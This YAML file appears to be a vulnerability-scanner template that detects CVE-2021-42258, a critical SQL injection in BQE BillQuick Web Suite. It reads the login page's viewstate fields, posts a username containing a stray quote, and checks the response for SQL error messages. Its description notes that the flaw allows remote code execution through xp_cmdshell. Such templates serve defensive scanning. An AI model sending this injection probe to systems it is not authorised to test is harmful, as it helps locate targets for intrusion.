id: CVE-2021-42258
info:
  author: dwisiswant0
  classification:
    cve-id: CVE-2021-42258
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
  description: BQE BillQuick Web Suite 2018 through 2021 before 22.0.9.1 allows SQL
    injection for unauthenticated remote code execution. Successful exploitation can
    include the ability to execute arbitrary code as MSSQLSERVER$ via xp_cmdshell.
  name: BillQuick Web Suite SQL Injection
  reference:
  - https://www.huntress.com/blog/threat-advisory-hackers-are-exploiting-a-vulnerability-in-popular-billing-software-to-deploy-ransomware
  - https://nvd.nist.gov/vuln/detail/CVE-2021-42258
  severity: critical
  tags: cve,cve2021,sqli,billquick
requests:
- cookie-reuse: true
  extractors:
  - attribute: value
    internal: true
    name: VS
    type: xpath
    xpath:
    - /html/body/form/div/input[@id='__VIEWSTATE']
  - attribute: value
    internal: true
    name: VSG
    type: xpath
    xpath:
    - /html/body/form/div/input[@id='__VIEWSTATEGENERATOR']
  - attribute: value
    internal: true
    name: EV
    type: xpath
    xpath:
    - /html/body/form/div/input[@id='__EVENTVALIDATION']
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - System.Data.SqlClient.SqlException
    - Incorrect syntax near
    - _ACCOUNTLOCKED
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nReferer: {{BaseURL}}\nOrigin: {{RootURL}}\n\
    Content-Type: application/x-www-form-urlencoded\n\n__EVENTTARGET=cmdOK&__EVENTARGUMENT=&__VIEWSTATE={{url_encode(\"\
    \xC2{{VS\xC2}}\")}}&__VIEWSTATEGENERATOR={{url_encode(\"\xC2{{VSG\xC2}}\")}}&__EVENTVALIDATION={{url_encode(\"\
    \xC2{{EV\xC2}}\")}}&txtID=uname%27&txtPW=passwd&hdnClientDPI=96\n"
